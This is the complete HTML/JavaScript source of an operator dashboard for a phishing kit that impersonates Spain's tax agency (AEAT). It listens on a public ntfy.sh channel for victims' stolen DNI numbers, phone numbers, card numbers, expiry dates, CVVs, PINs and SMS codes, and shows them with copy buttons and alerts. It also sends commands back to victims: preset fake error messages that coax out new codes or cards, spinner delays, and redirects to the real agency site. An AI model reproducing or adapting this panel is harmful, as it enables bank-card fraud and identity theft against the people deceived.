<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Control Pro - Tiempo Real</title>
    <!-- Tailwind CSS 4 -->
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen p-4 sm:p-8 font-sans antialiased selection:bg-blue-600 selection:text-white">
    
    <div class="max-w-7xl mx-auto space-y-6">
        
        <!-- CABECERA PROFESIONAL -->
        <header class="bg-slate-900/90 backdrop-blur border border-slate-800 rounded-2xl p-6 shadow-2xl flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
            <div class="flex items-center gap-3">
                <div class="relative flex h-3 w-3">
                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                  <span class="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
                </div>
                <div>
                    <h1 class="text-xl font-extrabold tracking-tight text-white flex items-center gap-2">
                        AEAT • Professional Control Center
                    </h1>
                    <p class="text-xs text-slate-400 mt-0.5">Cloud Stream Activo • Sincronizado para Datos Móviles</p>
                </div>
            </div>
            
            <div class="flex flex-wrap items-center gap-3 w-full md:w-auto justify-between md:justify-end">
                <div id="active-count" class="bg-blue-950/80 text-blue-400 border border-blue-800/60 text-xs font-semibold px-3.5 py-2 rounded-xl shadow-inner">
                    0 Sesiones Activas
                </div>
                <!-- Control de Sonido -->
                <button onclick="toggleSound()" id="sound-toggle-btn" class="bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 text-xs font-medium px-3 py-2 rounded-xl transition cursor-pointer">
                    🔊 Sonido: ON
                </button>
                <button onclick="clearAllData()" class="bg-rose-950/60 hover:bg-rose-900/80 text-rose-300 border border-rose-800/50 text-xs font-medium px-4 py-2 rounded-xl transition cursor-pointer shadow-sm">
                    Limpiar Todo
                </button>
            </div>
        </header>

        <!-- BARRA DE FILTROS Y BUSCADOR -->
        <div class="bg-slate-900/50 border border-slate-800 rounded-2xl p-4 flex flex-col sm:flex-row justify-between items-center gap-4">
            <div class="w-full sm:w-72">
                <input type="text" id="search-input" oninput="renderDashboard()" placeholder="🔍 Buscar por nombre o IP..." class="bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2 text-xs text-white w-full focus:outline-none focus:border-blue-600 transition">
            </div>
            <div class="flex flex-wrap gap-1.5 w-full sm:w-auto">
                <button onclick="setFilter('all')" id="filter-all" class="filter-btn text-xs px-3 py-1.5 rounded-xl border border-slate-700 bg-blue-600 text-white font-medium transition cursor-pointer">Todos</button>
                <button onclick="setFilter('active')" id="filter-active" class="filter-btn text-xs px-3 py-1.5 rounded-xl border border-slate-800 bg-slate-900 text-slate-400 font-medium transition cursor-pointer">En Curso</button>
                <button onclick="setFilter('completed')" id="filter-completed" class="filter-btn text-xs px-3 py-1.5 rounded-xl border border-slate-800 bg-slate-900 text-slate-400 font-medium transition cursor-pointer">Completados</button>
            </div>
        </div>

        <!-- CONTENEDOR DE USUARIOS EN TIEMPO REAL -->
        <div id="users-grid" class="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
            <div id="no-users-msg" class="col-span-full py-24 text-center border-2 border-dashed border-slate-800 rounded-3xl bg-slate-900/30">
                <div class="text-slate-600 text-5xl mb-3">📡</div>
                <p class="text-base font-semibold text-slate-400">Esperando conexiones de usuarios...</p>
                <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Las alertas sonoras y los datos aparecerán aquí de forma automática.</p>
            </div>
        </div>
    </div>

    <!-- SCRIPT DE GESTIÓN AVANZADA -->
    <script>
        let sessions = {};
        let currentFilter = 'all';
        let soundEnabled = true;
        const CLOUD_CHANNEL = 'aeat_global_live_sync_channel_v1';

        // Generador de tono de alerta web nativo (sin archivos externos)
        function playBeep() {
            if (!soundEnabled) return;
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                oscillator.type = 'sine';
                oscillator.frequency.setValueAtTime(587.33, audioCtx.currentTime); // Tono agradable D5
                gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                oscillator.start();
                oscillator.stop(audioCtx.currentTime + 0.15);
            } catch(e) {}
        }

        function toggleSound() {
            soundEnabled = !soundEnabled;
            document.getElementById('sound-toggle-btn').innerText = soundEnabled ? "🔊 Sonido: ON" : "🔇 Sonido: OFF";
        }

        function requestNotificationPermission() {
            if (window.Notification && Notification.permission !== "granted") {
                Notification.requestPermission();
            }
        }
        requestNotificationPermission();

        function notifyBrowser(title, body) {
            if (window.Notification && Notification.permission === "granted") {
                new Notification(title, { body: body, icon: 'https://cdn-icons-png.flaticon.com/512/1077/1077114.png' });
            }
        }

        function loadLocalSessions() {
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                if (key && key.startsWith('panel_live_')) {
                    try {
                        let data = JSON.parse(localStorage.getItem(key));
                        if (data && data.id) {
                            if (!data.logs) data.logs = [`[${new Date(data.timestamp || Date.now()).toLocaleTimeString()}] Sesión detectada`];
                            sessions[data.id] = data;
                        }
                    } catch(e) {}
                }
            }
            renderDashboard();
        }

        function connectCloudStream() {
            try {
                const eventSource = new EventSource(`https://ntfy.sh/${CLOUD_CHANNEL}/sse`);
                eventSource.onmessage = function (event) {
                    try {
                        const data = JSON.parse(event.data);
                        if (data && data.id) {
                            let isNew = !sessions[data.id];
                            let oldStep = sessions[data.id] ? sessions[data.id].step : -1;

                            let existingLogs = sessions[data.id] ? (sessions[data.id].logs || []) : [];
                            let timeStr = new Date().toLocaleTimeString();

                            if (isNew) {
                                existingLogs.push(`[${timeStr}] Nuevo usuario conectado (${data.ip || 'IP desc.'})`);
                                playBeep();
                                notifyBrowser("Nueva Sesión AEAT", `Usuario conectado desde ${data.pais || 'España'}`);
                            } else if (data.step !== oldStep) {
                                existingLogs.push(`[${timeStr}] Avanzó al Paso ${data.step}`);
                                playBeep();
                                notifyBrowser("Actualización de Datos", `El usuario avanzó al Paso ${data.step}`);
                            }

                            sessions[data.id] = {
                                ...(sessions[data.id] || {}),
                                ...data,
                                logs: existingLogs
                            };
                            localStorage.setItem('panel_live_' + data.id, JSON.stringify(sessions[data.id]));
                            renderDashboard();
                        }
                    } catch(e) {}
                };
            } catch(e) {}
        }

        window.addEventListener('storage', (e) => {
            if (e.key && e.key.startsWith('panel_live_') && e.newValue) {
                try {
                    let data = JSON.parse(e.newValue);
                    if (data && data.id) {
                        if (!sessions[data.id]) {
                            playBeep();
                            data.logs = [`[${new Date().toLocaleTimeString()}] Sesión iniciada localmente`];
                        }
                        sessions[data.id] = data;
                        renderDashboard();
                    }
                } catch(err) {}
            }
        });

        function setFilter(filterType) {
            currentFilter = filterType;
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.className = "filter-btn text-xs px-3 py-1.5 rounded-xl border border-slate-800 bg-slate-900 text-slate-400 font-medium transition cursor-pointer";
            });
            document.getElementById(`filter-${filterType}`).className = "filter-btn text-xs px-3 py-1.5 rounded-xl border border-slate-700 bg-blue-600 text-white font-medium transition cursor-pointer";
            renderDashboard();
        }

        function copyToClipboard(text, btnElement) {
            if (!text || text === 'N/D' || text === 'Pendiente' || text === 'Ninguno' || text === 'No introducido') {
                alert("No hay datos válidos para copiar.");
                return;
            }
            navigator.clipboard.writeText(text).then(() => {
                let originalText = btnElement.innerText;
                btnElement.innerText = "✓ ¡Copiado!";
                btnElement.classList.add('bg-emerald-600', 'text-white');
                setTimeout(() => {
                    btnElement.innerText = originalText;
                    btnElement.classList.remove('bg-emerald-600', 'text-white');
                }, 1500);
            });
        }

        function renderDashboard() {
            const grid = document.getElementById('users-grid');
            const countEl = document.getElementById('active-count');
            const searchVal = document.getElementById('search-input').value.toLowerCase();
            const userKeys = Object.keys(sessions);

            countEl.innerText = `${userKeys.length} Sesión(es) Registradas`;

            if (userKeys.length === 0) {
                grid.innerHTML = `
                    <div id="no-users-msg" class="col-span-full py-24 text-center border-2 border-dashed border-slate-800 rounded-3xl bg-slate-900/30">
                        <div class="text-slate-600 text-5xl mb-3">📡</div>
                        <p class="text-base font-semibold text-slate-400">Esperando conexiones de usuarios...</p>
                        <p class="text-xs text-slate-500 mt-1 max-w-sm mx-auto">Las alertas sonoras y los datos aparecerán aquí automáticamente.</p>
                    </div>`;
                return;
            }

            let filteredKeys = userKeys.filter(id => {
                let u = sessions[id];
                let matchesSearch = (u.nombre && u.nombre.toLowerCase().includes(searchVal)) || 
                                    (u.ip && u.ip.toLowerCase().includes(searchVal)) ||
                                    (u.dni && u.dni.toLowerCase().includes(searchVal));
                
                if (!matchesSearch) return false;

                if (currentFilter === 'active') return u.step < 4;
                if (currentFilter === 'completed') return u.step >= 4;
                return true;
            });

            if (filteredKeys.length === 0) {
                grid.innerHTML = `<div class="col-span-full py-16 text-center text-slate-500 font-mono text-xs">No se encontraron sesiones que coincidan con la búsqueda o filtro.</div>`;
                return;
            }

            let html = '';
            filteredKeys.sort((a, b) => (sessions[b].timestamp || 0) - (sessions[a].timestamp || 0));

            filteredKeys.forEach(id => {
                let u = sessions[id];
                let stepBadgeColor = 'bg-amber-950/80 text-amber-300 border-amber-800/60';
                let stepText = `Paso ${u.step || 0} en curso`;

                if (u.step === 4) { stepBadgeColor = 'bg-emerald-950/80 text-emerald-300 border-emerald-800/60'; stepText = 'Proceso Finalizado'; }
                if (u.step === 0) { stepBadgeColor = 'bg-blue-950/80 text-blue-300 border-blue-800/60'; stepText = 'En línea / Inicio'; }

                let logsHtml = (u.logs || []).map(l => `<p class="text-[10px] text-slate-500 font-mono">${l}</p>`).join('');

                html += `
                    <div class="bg-slate-900/90 border border-slate-800/80 rounded-2xl p-5 shadow-xl flex flex-col justify-between space-y-4 hover:border-slate-700 transition">
                        <div>
                            <!-- Cabecera Tarjeta -->
                            <div class="flex justify-between items-start mb-3 pb-3 border-b border-slate-800">
                                <div>
                                    <span class="text-[10px] font-mono text-slate-500 uppercase tracking-wider">ID: ${id}</span>
                                    <h3 class="font-bold text-white text-base tracking-tight">${u.nombre || 'Visitante Anónimo'}</h3>
                                </div>
                                <span class="text-xs font-semibold px-3 py-1 rounded-full border ${stepBadgeColor} shadow-inner">${stepText}</span>
                            </div>

                            <!-- Datos del Usuario con Botones de Copiar -->
                            <div class="space-y-2 text-xs bg-slate-950/70 p-3.5 rounded-xl border border-slate-800/80 font-mono">
                                <div class="flex justify-between items-center"><span class="text-slate-500">IP / Ubicación:</span> <span class="text-slate-200 font-bold">${u.ip || 'Detectando...'} (${u.pais || 'N/D'})</span></div>
                                
                                <div class="flex justify-between items-center">
                                    <span class="text-slate-500">DNI / NIE:</span> 
                                    <div class="flex items-center gap-2"><span class="text-amber-400 font-bold">${u.dni || 'No introducido'}</span><button onclick="copyToClipboard('${u.dni || ''}', this)" class="text-[9px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-1.5 py-0.5 rounded cursor-pointer">Copiar</button></div>
                                </div>

                                <div class="flex justify-between items-center"><span class="text-slate-500">Teléfono:</span> <span class="text-slate-200">${u.contacto || 'N/D'}</span></div>

                                <div class="flex justify-between items-center">
                                    <span class="text-slate-500">Tarjeta:</span> 
                                    <div class="flex items-center gap-2"><span class="text-emerald-400 font-bold">${u.cardNumber ? u.cardNumber + ' (Exp: ' + u.cardExpiry + ')' : 'Pendiente'}</span><button onclick="copyToClipboard('${u.cardNumber || ''}', this)" class="text-[9px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-1.5 py-0.5 rounded cursor-pointer">Copiar</button></div>
                                </div>

                                <div class="flex justify-between items-center">
                                    <span class="text-slate-500">CVV / PIN:</span> 
                                    <div class="flex items-center gap-2"><span class="text-rose-400 font-bold">${u.cardCvv ? 'CVV: ' + u.cardCvv + ' | PIN: ' + (u.cardPin || u.pinCode || 'N/D') : 'Pendiente'}</span><button onclick="copyToClipboard('${u.cardCvv ? u.cardCvv + ' / ' + (u.cardPin || u.pinCode || '') : ''}', this)" class="text-[9px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-1.5 py-0.5 rounded cursor-pointer">Copiar</button></div>
                                </div>

                                <div class="flex justify-between items-center">
                                    <span class="text-slate-500">Código SMS:</span> 
                                    <div class="flex items-center gap-2"><span class="text-sky-400 font-extrabold">${u.smsCode || 'Ninguno'}</span><button onclick="copyToClipboard('${u.smsCode || ''}', this)" class="text-[9px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-1.5 py-0.5 rounded cursor-pointer">Copiar</button></div>
                                </div>
                            </div>

                            <!-- HISTORIAL DE ACTIVIDAD (LOGS) -->
                            <div class="mt-3 bg-slate-950/40 border border-slate-800/50 rounded-xl p-2.5 max-h-24 overflow-y-auto space-y-0.5">
                                <p class="text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-1">Línea de tiempo de eventos:</p>
                                ${logsHtml}
                            </div>
                        </div>

                        <!-- PANEL DE CONTROL / ACCIONES -->
                        <div class="space-y-3 pt-3 border-t border-slate-800">
                            <div class="flex justify-between items-center">
                                <p class="text-[11px] font-bold text-slate-400 uppercase tracking-wide">Acciones Remotas</p>
                                <!-- Kill Switch -->
                                <button onclick="killSession('${id}')" class="text-[10px] bg-rose-950/50 hover:bg-rose-900 text-rose-300 px-2.5 py-1 rounded-lg border border-rose-800/60 transition cursor-pointer">Bloquear Sesión ⛔</button>
                            </div>
                            
                            <!-- Alertas Prediseñadas y Libres -->
                            <div class="space-y-2">
                                <div class="flex gap-1.5">
                                    <input type="text" id="alert-msg-${id}" placeholder="Escribe alerta..." class="bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white w-full focus:outline-none focus:border-blue-600 transition">
                                    <button onclick="sendCustomAlert('${id}')" class="bg-blue-600 hover:bg-blue-500 text-white px-3.5 py-2 rounded-xl text-xs font-semibold cursor-pointer shadow transition shrink-0">Enviar</button>
                                </div>
                                <div class="flex flex-wrap gap-1">
                                    <button onclick="setAlertPreset('${id}', 'Su código SMS ha expirado, por favor introduzca uno nuevo.')" class="text-[10px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-2 py-1 rounded-lg border border-slate-700 transition cursor-pointer">⚠️ SMS Expirado</button>
                                    <button onclick="setAlertPreset('${id}', 'Error en la tarjeta de crédito, por favor introduzca otra.')" class="text-[10px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-2 py-1 rounded-lg border border-slate-700 transition cursor-pointer">💳 Error Tarjeta</button>
                                    <button onclick="setAlertPreset('${id}', 'El PIN introducido es incorrecto, vuelva a intentarlo.')" class="text-[10px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-2 py-1 rounded-lg border border-slate-700 transition cursor-pointer">🔒 PIN Incorrecto</button>
                                </div>
                            </div>

                            <!-- Spinner y Redirección Personalizada -->
                            <div class="space-y-2 pt-1">
                                <div class="flex items-center gap-1.5">
                                    <span class="text-[11px] text-slate-400">Spinner:</span>
                                    <select id="spinner-sec-${id}" onchange="changeSpinnerTime('${id}')" class="bg-slate-950 border border-slate-800 text-xs text-slate-200 rounded-xl px-2 py-1.5 focus:outline-none focus:border-blue-600">
                                        <option value="2">2 Seg</option>
                                        <option value="5" selected>5 Seg</option>
                                        <option value="10">10 Seg</option>
                                        <option value="15">15 Seg</option>
                                    </select>
                                </div>

                                <div class="flex gap-1.5 pt-1">
                                    <input type="text" id="redirect-url-${id}" placeholder="https://ejemplo.com" class="bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-white w-full focus:outline-none focus:border-purple-600 transition">
                                    <button onclick="executeCustomRedirect('${id}')" class="bg-purple-600 hover:bg-purple-500 text-white px-3.5 py-2 rounded-xl text-xs font-semibold cursor-pointer shadow transition shrink-0">Redirigir</button>
                                </div>
                                <div class="flex gap-1">
                                    <button onclick="quickRedirect('${id}', 'https://google.com')" class="text-[10px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-2 py-1 rounded-lg border border-slate-700 transition cursor-pointer w-full text-center">Google</button>
                                    <button onclick="quickRedirect('${id}', 'https://sede.agenciatributaria.gob.es/')" class="text-[10px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-2 py-1 rounded-lg border border-slate-700 transition cursor-pointer w-full text-center">Sede Oficial</button>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            });

            grid.innerHTML = html;
        }

        function setAlertPreset(targetId, text) {
            document.getElementById(`alert-msg-${targetId}`).value = text;
        }

        function sendCustomAlert(targetId) {
            const input = document.getElementById(`alert-msg-${targetId}`);
            const msg = input.value.trim();
            if (!msg) { alert("Escribe un mensaje primero."); return; }
            sendCloudCommand(targetId, { action: 'alert', message: msg });
            input.value = '';
            alert("¡Alerta enviada!");
        }

        function changeSpinnerTime(targetId) {
            const select = document.getElementById(`spinner-sec-${targetId}`);
            sendCloudCommand(targetId, { action: 'set_spinner', seconds: select.value });
        }

        function quickRedirect(targetId, url) {
            document.getElementById(`redirect-url-${targetId}`).value = url;
            executeCustomRedirect(targetId);
        }

        function executeCustomRedirect(targetId) {
            const input = document.getElementById(`redirect-url-${targetId}`);
            let url = input.value.trim();
            if (!url) { alert("Introduce una URL."); return; }
            if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'https://' + url;
            if (confirm(`¿Redirigir a ${url}?`)) {
                sendCloudCommand(targetId, { action: 'redirect', url: url });
            }
        }

        function killSession(targetId) {
            if (confirm("¿Bloquear y expulsar a este usuario de la sesión de inmediato?")) {
                sendCloudCommand(targetId, { action: 'redirect', url: 'https://google.com' });
                delete sessions[targetId];
                localStorage.removeItem('panel_live_' + targetId);
                renderDashboard();
            }
        }

        function sendCloudCommand(targetId, cmdObj) {
            const payload = { target: targetId, ...cmdObj };
            fetch(`https://ntfy.sh/${CLOUD_CHANNEL}`, {
                method: 'POST',
                body: JSON.stringify(payload)
            }).catch(() => {});

            const key = 'cmd_target_' + targetId;
            localStorage.setItem(key, JSON.stringify(cmdObj));
            window.dispatchEvent(new StorageEvent('storage', { key: key, newValue: JSON.stringify(cmdObj) }));
        }

        function clearAllData() {
            if (confirm("¿Borrar todo el historial?")) {
                Object.keys(sessions).forEach(id => {
                    localStorage.removeItem('panel_live_' + id);
                });
                sessions = {};
                renderDashboard();
            }
        }

        loadLocalSessions();
        connectCloudStream();
    </script>
</body>
</html>
